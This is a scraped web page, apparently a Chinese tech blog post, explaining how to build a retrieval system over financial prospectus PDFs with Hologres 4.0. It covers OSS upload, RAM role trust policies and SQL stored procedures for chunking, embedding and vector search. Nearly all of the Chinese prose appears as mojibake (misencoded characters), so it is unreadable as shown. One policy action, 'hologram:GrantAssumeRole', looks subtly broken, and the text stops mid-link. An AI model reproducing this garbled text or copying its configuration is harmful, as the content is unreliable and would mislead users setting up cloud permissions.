                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®é©±åŠ¨æ—¶ä»£ï¼Œéç»“æ„åŒ–æ•°æ®ï¼ˆæ–‡æœ¬ã€å›¾åƒã€éŸ³è§†é¢‘ã€æ—¥å¿—ç­‰ï¼‰ä¸ç»“æ„åŒ–ã€åŠç»“æ„åŒ–æ•°æ®ï¼ˆJSONï¼‰å…±åŒæ„æˆä¼ä¸šçš„æ ¸å¿ƒæ•°æ®èµ„äº§ã€‚å…¶ä¸­ï¼Œéç»“æ„åŒ–æ•°æ®ä»¥æ›´åŸå§‹ã€å¤šå…ƒçš„å½¢æ€è•´å«ç€æµ·é‡çš„ä¸šåŠ¡æ´å¯Ÿï¼ˆå¦‚ç”¨æˆ·åé¦ˆã€åˆåŒæ¡æ¬¾ã€äº§å“ç¼ºé™·å›¾åƒï¼‰ï¼ŒHologres4.0ä»¥â€œAIæ—¶ä»£çš„ä¸€ç«™å¼å¤šæ¨¡æ€åˆ†æå¹³å°â€ä¸ºæ ¸å¿ƒç†å¿µï¼Œå…¨é¢å±•ç¤ºäº†Hologresåœ¨ç»“æ„åŒ–ã€åŠç»“æ„åŒ–ä¸éç»“æ„åŒ–æ•°æ®åˆ†æèƒ½åŠ›ä¸Šçš„é‡å¤§çªç ´ï¼Œå‘å¸ƒå…¨æ–°å‘é‡ç´¢å¼•HGraphï¼Œç™»é¡¶ VectorDBBench æ€§ä»·æ¯”æ¦œå•QPSã€Recallã€Latencyã€Load å››é¡¹ç¬¬ä¸€ï¼Œä¸ºAIåº”ç”¨çš„æä¾›é«˜æ€§ä»·æ¯”ã€é«˜ååã€ä½å»¶è¿Ÿã€é«˜å¹¶å‘çš„å‘é‡æœåŠ¡ï¼Œæˆä¸ºå…¨çƒæœ€å…·æ€§ä»·æ¯”çš„å‘é‡æ•°æ®åº“ï¼</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/234572/1763605302728-d98ab5c3-997d-401d-afcf-592d5a871ef0.png" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">åŸºäºHologresæ„å»ºå¤šæ¨¡æ€AIæ•°æ®åˆ†æä¸æ£€ç´¢ç³»ç»Ÿ</h2>
<p>æœ¬æ–‡å°†ä¼šæ¨¡æ‹Ÿé‡‘èåœºæ™¯ä¸­å¯¹æ‹›è‚¡ä¹¦ã€åˆåŒç­‰PDFæ–‡ä»¶çš„æ£€ç´¢ä¸åˆ†æï¼Œä»¥è¾…åŠ©ä¸šåŠ¡è¿›è¡Œä¸‹ä¸€æ­¥çš„ç²¾ç»†åŒ–è¿è¥å†³ç­–ã€‚åŸºäºHologres 4.0 å¯¹PDFéç»“æ„åŒ–æ•°æ®çš„å¤„ç†ä¸æ£€ç´¢ï¼ŒåŒ…å«çš„ä¸»è¦èƒ½åŠ›å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>éç»“æ„åŒ–æ•°æ®ï¼ˆObject Tableï¼‰ï¼šæ”¯æŒé€šè¿‡è¡¨çš„å½¢å¼è¯»å–OSSä¸­éç»“æ„åŒ–æ•°æ®ï¼ˆPDF/IMAGE/PPTç­‰ï¼‰ã€‚</p>
</li>
<li>
<p>AI Functionï¼šåœ¨Hologresä¸­å¯ä»¥ç”¨æ ‡å‡†SQLçš„æ–¹å¼è°ƒç”¨AI Functionï¼Œè‡ªåŠ¨è°ƒç”¨å†…ç½®å¤§æ¨¡å‹ï¼Œå®ŒæˆAIæœåŠ¡å»ºè®¾åœºæ™¯</p>
</li>
<li>
<p>æ•°æ®åŠ å·¥ï¼šæä¾›Embedã€Chunkç®—å­ï¼Œå¯ä»¥å¯¹éç»“æ„åŒ–æ•°æ®åŠ å·¥æˆç»“æ„åŒ–æ•°æ®å­˜å‚¨ï¼Œæ— éœ€ä½¿ç”¨å¤–éƒ¨ç®—æ³•å°±èƒ½è‡ªåŠ¨Embedã€‚</p>
</li>
<li>
<p>æ•°æ®æ£€ç´¢å’Œåˆ†æï¼šæä¾›<code>ai_gen</code>ã€<code>ai_summarize</code>ç­‰ç®—å­ï¼Œèƒ½å¤Ÿé€šè¿‡SQLå¯¹æ•°æ®è¿›è¡Œæ¨ç†ã€é—®é¢˜æ€»ç»“åŠç¿»è¯‘ç­‰æ“ä½œã€‚</p>
</li>
<li>
<p>Dynamic Tableä»‹ç»ï¼šæ”¯æŒå¢é‡åˆ·æ–°æ¨¡å¼å¯¹éç»“æ„åŒ–æ•°æ®è‡ªåŠ¨åŠ å·¥ï¼Œæ¯æ¬¡åªè®¡ç®—å¢é‡çš„æ•°æ®æœ‰æ•ˆå‡å°‘é‡å¤è®¡ç®—ï¼Œé™ä½èµ„æºåˆ©ç”¨ç‡ã€‚</p>
</li>
<li>
<p>å‘é‡æ£€ç´¢ï¼šæ”¯æŒæ ‡å‡†SQLçš„å‘é‡æ£€ç´¢ï¼Œç”¨äºéç»“æ„åŒ–æ•°æ®çš„ç›¸ä¼¼åº¦æœç´¢ã€åœºæ™¯è¯†åˆ«ç­‰ï¼Œåœ¨åŒä¸€ä¸ªæŸ¥è¯¢ä¸­å¯ä»¥è‡ªç”±åœ°å®ç°å‘é‡å’Œæ ‡é‡çš„æ£€ç´¢ã€‚</p>
</li>
<li>
<p>å…¨æ–‡æ£€ç´¢ï¼šé€šè¿‡å€’æ’ç´¢å¼•ã€åˆ†è¯ç­‰æœºåˆ¶å®ç°å¯¹éç»“æ„åŒ–æ•°æ®çš„é«˜æ•ˆæ£€ç´¢ï¼Œæ”¯æŒå…³é”®è¯åŒ¹é…ã€çŸ­è¯­æ£€ç´¢ç­‰ä¸°å¯Œçš„æ£€ç´¢æ–¹å¼ï¼Œå®ç°æ›´åŠ çµæ´»çš„æ£€ç´¢ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">æ–¹æ¡ˆä¼˜åŠ¿</h2>
<p>é€šè¿‡å¦‚ä¸Šæ ¸å¿ƒèƒ½åŠ›ï¼Œåœ¨Hologresä¸­å¤šæ¨¡æ€AIæ£€ç´¢ä¸åˆ†æçš„æ ¸å¿ƒä¼˜åŠ¿å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>å®Œæ•´çš„<strong><strong>AI</strong></strong>æ•°æ®å¤„ç†æµç¨‹</strong>ï¼šæ¶µç›–ä»æ•°æ®Embedã€Chunkã€å¢é‡åŠ å·¥ã€æ£€ç´¢/åˆ†æçš„å…¨æµç¨‹ï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨å¤§æ•°æ®ç³»ç»Ÿä¸€æ ·ï¼Œè½»æ¾æ„å»ºAIåº”ç”¨ã€‚</li>
<li><strong>æ ‡å‡†<strong><strong>SQL</strong></strong>åŠ å·¥å’Œåˆ†æéç»“æ„åŒ–æ•°æ®</strong>ï¼šæ— éœ€ä½¿ç”¨ä¸“ç”¨å¼€å‘è¯­è¨€ï¼Œ<strong>çº¯****SQL</strong>å°±èƒ½å®Œæˆéç»“æ„åŒ–æ•°æ®æå–ã€åŠ å·¥ï¼Œä¹Ÿæ— éœ€å€ŸåŠ©å¤–éƒ¨ç³»ç»Ÿï¼Œæ•°æ®å¤„ç†æ›´åŠ é«˜æ•ˆå’Œç®€å•ï¼Œé™ä½å¼€å‘äººå‘˜å­¦ä¹ æˆæœ¬ã€‚</li>
<li><strong>æ£€ç´¢æ›´ç²¾å‡†ã€çµæ´»å’Œæ™ºèƒ½</strong>ï¼šå¯ä»¥è½»æ¾æ„å»ºâ€œå…³é”®è¯+è¯­ä¹‰+å¤šæ¨¡æ€â€çš„æ··åˆæ£€ç´¢é“¾è·¯ï¼Œè¦†ç›–ä»ç²¾å‡†æœç´¢åˆ°æ„å›¾ç†è§£çš„å…¨åœºæ™¯éœ€æ±‚ã€‚è¿˜èƒ½ç»“åˆAI Functionå®ç°å¯¹ç”¨æˆ·æ„å›¾çš„æ·±åº¦ç†è§£ï¼Œè¯­ä¹‰å…³è”å’Œä¸Šä¸‹æ–‡æ¨ç†ï¼Œå®ç°æ›´æ™ºèƒ½çš„æ£€ç´¢èƒ½åŠ›ã€‚</li>
<li><strong>æ•°æ®ä¸å‡ºåº“ï¼Œæ›´å®‰å…¨</strong>ï¼šä¸éœ€è¦å°†æ•°æ®å¯¼å‡ºåˆ°å¤–éƒ¨ç³»ç»Ÿï¼Œä¸hologresçš„å¤šç§å®‰å…¨èƒ½åŠ›æ— ç¼é›†æˆï¼Œé«˜æ•ˆä¿æŠ¤æ•°æ®å®‰å…¨ã€‚</li>
</ul>
<p>æœ¬å®è·µæ–‡æ¡£å°†ä¼šä»‹ç»å¦‚ä½•é€šè¿‡ä¸Šè¯‰æ ¸å¿ƒèƒ½åŠ›åœ¨Hologresä¸­å¯¹éç»“æ„åŒ–æ•°æ®åŠ å·¥å’Œæ£€ç´¢ï¼ŒåŠ©åŠ›æ­å»ºä¼ä¸šçº§å¤šæ¨¡æ€AIæ•°æ®å¹³å°ï¼Œæ‰“ç ´æ•°æ®å­¤å²›ï¼Œé‡Šæ”¾å…¨åŸŸæ•°æ®ä»·å€¼</p>
<h2 data-id="heading-2">æ–¹æ¡ˆæµç¨‹</h2>
<p>æœ¬æ¬¡æ–¹æ¡ˆçš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<p>1. æ•°æ®é›†å‡†å¤‡ã€‚</p>
<p>å°†<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelscope.cn%2Fdatasets%2FBJQW14B%2Fbs_challenge_financial_14b_dataset" target="_blank" title="https://modelscope.cn/datasets/BJQW14B/bs_challenge_financial_14b_dataset" ref="nofollow noopener noreferrer">é‡‘èæ•°æ®é›†</a>ä¸­çš„PDFæ–‡ä»¶ä¸Šä¼ è‡³OSSå­˜å‚¨ã€‚</p>
<p>2. PDFæ•°æ®åŠ å·¥ã€‚</p>
<p>ä½¿ç”¨Object Tableè¯»å–PDFçš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œç„¶ååˆ›å»ºå¢é‡åˆ·æ–°çš„Dynamic Tableï¼Œå¹¶å¯¹æ•°æ®è¿›è¡ŒEmbedå’ŒChunkï¼ŒåŒæ—¶ä¹Ÿå¯¹Dynamic Tableæ„å»ºå‘é‡ç´¢å¼•å’Œå…¨æ–‡ç´¢å¼•ï¼Œä»¥ä¾¿åç»­æ£€ç´¢å¯ä»¥ä½¿ç”¨ç´¢å¼•çš„èƒ½åŠ›ã€‚</p>
<p>3. ä½¿ç”¨<code>ai_embed</code>ç®—å­å¯¹å°†è‡ªç„¶è¯­è¨€çš„é—®é¢˜è¿›è¡ŒEmbeddingï¼Œç„¶åä½¿ç”¨å…¨æ–‡å’Œå‘é‡åŒè·¯å¬å›ç»“æœï¼Œå¹¶å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œç»“åˆå¤§æ¨¡å‹çš„æ¨ç†èƒ½åŠ›ï¼Œæœ€ç»ˆè¾“å‡ºç›¸ä¼¼åº¦æœ€é«˜çš„ç­”æ¡ˆã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/svg/234572/1763604671276-6161ebfd-fe4e-4ba9-8fe7-86ef313bf16b.svg" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">å‡†å¤‡å·¥ä½œ</h2>
<p>1. æ•°æ®å‡†å¤‡</p>
<p>æœ¬æ–‡ä½¿ç”¨ModelScopeå…¬å¼€çš„é‡‘èæ•°æ®é›†ä¸­çš„PDFæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œå…±80ä»½å…¬å¸æ‹›è‚¡è¯´æ˜ä¹¦ã€‚</p>
<p>2. ç¯å¢ƒå‡†å¤‡</p>
<ul>
<li>è´­ä¹°Hologres V4.0åŠä»¥ä¸Šç‰ˆæœ¬å®ä¾‹å¹¶åˆ›å»ºæ•°æ®åº“ã€‚</li>
<li>è´­ä¹°AIèµ„æºã€‚</li>
</ul>
<p>æœ¬æ–‡ä»¥large-96core-512GB-384GBã€1ä¸ªèŠ‚ç‚¹ä¸ºä¾‹ã€‚</p>
<ul>
<li>æ¨¡å‹éƒ¨ç½²ã€‚æœ¬æ¬¡æ–¹æ¡ˆä½¿ç”¨çš„æ¨¡å‹ä»¥åŠåˆ†é…çš„èµ„æºä¸ºï¼š</li>
</ul>
<p><strong>æ¨¡å‹åç§°</strong></p>
<p><strong>æ¨¡å‹ç±»åˆ«</strong></p>
<p><strong>æ¨¡å‹ä½œç”¨æè¿°</strong></p>
<p><strong>å•å‰¯æœ¬****CPUï¼ˆCoreï¼‰</strong></p>
<p><strong>å•å‰¯æœ¬å†…å­˜</strong></p>
<p><strong>å•å‰¯æœ¬****GPU</strong></p>
<p><strong>èµ„æºå‰¯æœ¬æ•°</strong></p>
<p>to_doc</p>
<p>ds4sd/docling-models</p>
<p>å°†PDFè½¬æ¢æˆæ–‡æ¡£ã€‚</p>
<p>20</p>
<p>100 GB</p>
<p>1å¡(48 GB)</p>
<p>1</p>
<p>chunk</p>
<p>recursive-character-text-splitter</p>
<p>æ–‡æ¡£åˆ‡ç‰‡ï¼Œæ¯ä¸ªPDFè¾ƒå¤§ï¼Œå»ºè®®ä½¿ç”¨åˆ‡ç‰‡ã€‚</p>
<p>15</p>
<p>30 GB</p>
<p>0å¡(0 GB)</p>
<p>1</p>
<p>pdf_embed</p>
<p>BAAI/bge-base-zh-v1.5</p>
<p>æ–‡æ¡£Embeddingã€‚</p>
<p>7</p>
<p>30 GB</p>
<p>1å¡(96 GB)</p>
<p>1</p>
<p>llm</p>
<p>Qwen/Qwen3-32B</p>
<p>ä½¿ç”¨å¤§æ¨¡å‹å¯¹æ£€ç´¢å‡ºçš„æ–‡æ¡£å†…å®¹æŒ‰ç…§æç¤ºè¯æ¨ç†.</p>
<p>7</p>
<p>30 GB</p>
<p>1å¡(96 GB)</p>
<p>1</p>
<p><strong>è¯´æ˜</strong>ä¸Šè¿°æ¨¡å‹çš„èµ„æºå‡ä¸ºé»˜è®¤åˆ†é…çš„èµ„æºã€‚</p>
<h2 data-id="heading-4">æ“ä½œæ­¥éª¤</h2>
<p><strong>ä¸‹è½½PDFæ–‡ä»¶å¹¶ä¸Šä¼ è‡³OSSã€‚</strong></p>
<p>1. ä¸‹è½½åšé‡‘å¤§æ¨¡å‹æŒ‘æˆ˜èµ›-é‡‘èåƒé—®14bæ•°æ®é›†ä¸­80ä»½æ‹›è‚¡ä¹¦ï¼ˆPDFï¼‰ã€‚</p>
<p>2. ç™»å½•OSSç®¡ç†æ§åˆ¶å°ï¼Œåˆ›å»ºBucketå¹¶å°†å·²ä¸‹è½½çš„PDFæ–‡ä»¶ä¸Šä¼ è‡³è¯¥Bucketè·¯å¾„ä¸‹ã€‚ä¸Šä¼ æ“ä½œè¯¦æƒ…ï¼Œè¯·å‚è§ç®€å•ä¸Šä¼ ã€‚</p>
<p><strong>è´¦å·æˆæƒã€‚</strong><br/>
1. ç™»å½•RAMæ§åˆ¶å°ï¼Œåˆ›å»ºé˜¿é‡Œäº‘RAMè§’è‰²å¹¶æˆäºˆOSSçš„ç›¸å…³æƒé™ã€‚</p>
<p>æ¨èæˆäºˆAliyunOSSReadOnlyAccessæƒé™ã€‚</p>
<p>2. ä¸ºä¸Šè¿°é˜¿é‡Œäº‘RAMè§’è‰²æ·»åŠ ç™»å½•å’ŒHologresçš„è®¿é—®æƒé™ã€‚</p>
<p>é˜¿é‡Œäº‘è´¦å·ï¼ˆä¸»è´¦å·ï¼‰</p>
<p>ä¿®æ”¹RAMè§’è‰²çš„ä¿¡ä»»ç­–ç•¥ã€‚é‡ç‚¹éœ€æ›´æ–°å¦‚ä¸‹å‚æ•°ï¼š</p>
<ul>
<li>
<p>Actionï¼šæ›´æ–°ä¸º<code>sts:AssumeRole</code>ã€‚</p>
</li>
<li>
<p>Serviceï¼šæ›´æ–°ä¸º<code>hologres.aliyuncs.com</code>ã€‚</p>
<p>{
"Statement": [
{
"Action": "sts:AssumeRole",
"Effect": "Allow",
"Principal": {
"RAM": [
"acs:ram::1866xxxx:root"
],
"Service": [
"hologres.aliyuncs.com"
]
}
}
],
"Version": "1"
}</p>
</li>
</ul>
<p>RAMç”¨æˆ·ï¼ˆå­è´¦å·ï¼‰<br/>
1. ä¸ºRAMç”¨æˆ·æˆæƒã€‚</p>
<ul>
<li>åœ¨<strong>æƒé™ç®¡ç†</strong> <strong>&gt;</strong> <strong>æƒé™ç­–ç•¥</strong>é¡µé¢ï¼Œå•å‡»<strong>åˆ›å»ºæƒé™ç­–ç•¥</strong>ï¼Œå¹¶é€‰æ‹©<strong>è„šæœ¬ç¼–è¾‘</strong>æ¨¡å¼åˆ›å»ºæƒé™ç­–ç•¥ã€‚å…·ä½“æ“ä½œï¼Œè¯·å‚è§åˆ›å»ºè‡ªå®šä¹‰æƒé™ç­–ç•¥</li>
</ul>
<p>Hologreså¯é€šè¿‡è¯¥ç­–ç•¥åˆ¤æ–­å½“å‰RAMç”¨æˆ·æ˜¯å¦å…·å¤‡åˆ›å»ºå¯¹åº”RAMè§’è‰²çš„æƒé™ã€‚æƒé™ç­–ç•¥å†…å®¹å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"Version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"Statement"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"Effect"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Allow"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"Action"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hologram:GrantAssumeRole"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"Resource"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;arnè´¦å·&gt;"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>åœ¨<strong>èº«ä»½ç®¡ç† &gt; ç”¨æˆ·</strong>é¡µé¢ï¼Œå•å‡»ç›®æ ‡RAMç”¨æˆ·<strong>æ“ä½œ</strong>åˆ—ä¸­çš„<strong>æ·»åŠ æƒé™</strong>ï¼Œä¸ºRAMç”¨æˆ·ï¼ˆå­è´¦å·ï¼‰æˆäºˆä¸Šè¿°æ­¥éª¤å·²åˆ›å»ºçš„æƒé™ç­–ç•¥ã€‚å…·ä½“æ“ä½œï¼Œè¯·å‚è§ä¸ºRAMç”¨æˆ·æˆæƒã€‚</li>
</ul>
<p>2. ä¸ºå·²åˆ›å»ºçš„RAMè§’è‰²æˆæƒã€‚</p>
<p>ä¿®æ”¹RAMè§’è‰²çš„ä¿¡ä»»ç­–ç•¥ã€‚é‡ç‚¹éœ€æ›´æ–°å¦‚ä¸‹å‚æ•°ï¼š</p>
<ul>
<li>
<p>Actionï¼šæ›´æ–°ä¸º<code>sts:AssumeRole</code>ã€‚</p>
</li>
<li>
<p>Serviceï¼šæ›´æ–°ä¸º<code>hologres.aliyuncs.com</code>ã€‚</p>
<p>{
"Statement": [
{
"Action": "sts:AssumeRole",
"Effect": "Allow",
"Principal": {
"RAM": [
"acs:ram::1866xxxx:root"
],
"Service": [
"hologres.aliyuncs.com"
]
}
}
],
"Version": "1"
}</p>
</li>
</ul>
<p>3. å¯¹PDFæ–‡ä»¶è¿›è¡ŒEmbeddingå’ŒChunkã€‚</p>
<p>éœ€è¦åˆ›å»ºObject Tableå’ŒDynamic Tableå¯¹PDFçš„å…ƒæ•°æ®è¯»å–ä»¥åŠåŠ å·¥ã€‚å› ä¸ºæµç¨‹è¾ƒé•¿ï¼ŒHologresç›´æ¥å°†å…¶å°è£…ä¸ºå­˜å‚¨è¿‡ç¨‹ã€‚è¯¥å­˜å‚¨è¿‡ç¨‹åŒ…æ‹¬çš„èƒ½åŠ›å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¼šåˆ›å»ºä¸€å¼ Object Tableï¼Œç”¨äºå–PDFçš„å…ƒæ•°æ®ã€‚</li>
<li>åˆ›å»ºä¸€å¼ å¢é‡åˆ·æ–°æ¨¡å¼çš„Dynamic Tableç»“æœè¡¨ï¼Œç”¨äºå­˜å‚¨åŠ å·¥åçš„æ•°æ®ã€‚åŒæ—¶ï¼Œè¯¥è¡¨éœ€è®¾ç½®å‘é‡ç´¢å¼•å’Œå…¨æ–‡ç´¢å¼•ï¼Œä¸”Dynamic Tableä¸è®¾ç½®è‡ªåŠ¨åˆ·æ–°ï¼Œéœ€è¦æ‰‹åŠ¨åˆ·æ–°ã€‚</li>
<li>Dynamic Tableçš„åˆ·æ–°è¿‡ç¨‹ä¸­ä¼šä½¿ç”¨<code>ai_embed</code>ã€<code>ai_chunk</code>å¯¹æ•°æ®è¿›è¡ŒEmbedå’Œåˆ‡ç‰‡ã€‚</li>
</ul>
<p>è¯¥å­˜å‚¨è¿‡ç¨‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">CALL create_rag_corpus_from_oss(
    <span class="hljs-attr">oss_path</span> =&gt; <span class="hljs-string">'oss://xxxx/bs_challenge_financial_14b_dataset/pdf'</span>,
    <span class="hljs-attr">oss_endpoint</span> =&gt; <span class="hljs-string">'oss-cn-hangzhou-internal.aliyuncs.com'</span>,
    <span class="hljs-attr">oss_role_arn</span> =&gt; <span class="hljs-string">'acs:ram::186xxxx:role/xxxx'</span>,
    <span class="hljs-attr">corpus_table</span> =&gt; <span class="hljs-string">'public.dt_bs_challenge_financial'</span>
)<span class="hljs-comment">;</span>
</code></pre>
<p>4. åˆ·æ–°ç»“æœè¡¨ã€‚</p>
<p>é€šè¿‡å¦‚ä¸Šå­˜å‚¨è¿‡ç¨‹åˆ›å»ºçš„Object Tableå’ŒDynamic Tableå‡éœ€æ‰‹åŠ¨åˆ·æ–°ï¼Œæ‰èƒ½å®Œæˆæ•°æ®åŠ å·¥ã€‚è¯¥æ­¥éª¤å·²è¢«å°è£…ä¸ºPDFåŠ å·¥å­˜å‚¨è¿‡ç¨‹ï¼Œè¯¥å­˜å‚¨è¿‡ç¨‹åŒ…æ‹¬çš„èƒ½åŠ›å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ·æ–°ä¸€æ¬¡Object Tableè·å–PDFå…ƒæ•°æ®</li>
<li>åˆ·æ–°ä¸€æ¬¡Dynamic Tableï¼Œè¿›è¡ŒPDFçš„Embeddingå’ŒChunkåŠ å·¥ã€‚</li>
</ul>
<p>è¯¥å­˜å‚¨è¿‡ç¨‹ä½¿ç”¨ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">CALL refresh_rag_corpus_table(
    <span class="hljs-attr">corpus_table</span> =&gt; <span class="hljs-string">'public.dt_bs_challenge_financial'</span>
)<span class="hljs-comment">;</span>
</code></pre>
<p>5. PDFæ£€ç´¢ã€‚</p>
<p>åŠ å·¥å¥½çš„æ•°æ®å¯ä»¥æ ¹æ®ä¸šåŠ¡ä½¿ç”¨åœºæ™¯ï¼Œé€šè¿‡å‘é‡ã€å…¨æ–‡ç­‰æ–¹å¼è¿›è¡Œæ£€ç´¢ã€‚ä¾‹å¦‚ï¼šå¯ä»¥æ ¹æ®æ‹›è‚¡ä¹¦æ¥æŸ¥è¯¢æŸä¸ªå…¬å¸çš„ä¸šç»©èµ°åŠ¿ï¼Œä»¥æ­¤æ¥åˆ¤æ–­å…¬å¸åç»­çš„èµ°åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼Œä»¥ä¾¿å¯¹åç»­çš„æŠ•èµ„æ„å‘æä¾›è¾…åŠ©å»ºè®®ã€‚</p>
<h3 data-id="heading-5">å‘é‡æ£€ç´¢</h3>
<p>åœ¨å‘é‡æ£€ç´¢æ—¶ï¼Œä¸ºäº†æ£€ç´¢æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†é—®é¢˜Embeddingå’ŒPromptæ„å»ºï¼Œå¤§æ¨¡å‹è¾“å‡ºç­”æ¡ˆç­‰è¿‡ç¨‹å°è£…æˆä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fhologres%2Fuser-guide%2Fbest-practices-financial-multimodal-ai-data-analysis-and-retrieval-system%3Fspm%3Da2c4g.11186623.help-menu-113622.d_2_6_5_0.476c4bf26JuD6N%26scm%3D20140722.H_2982978._.OR_help-T_cn~zh-V_1%239b9ac4eba36lk" target="_blank" 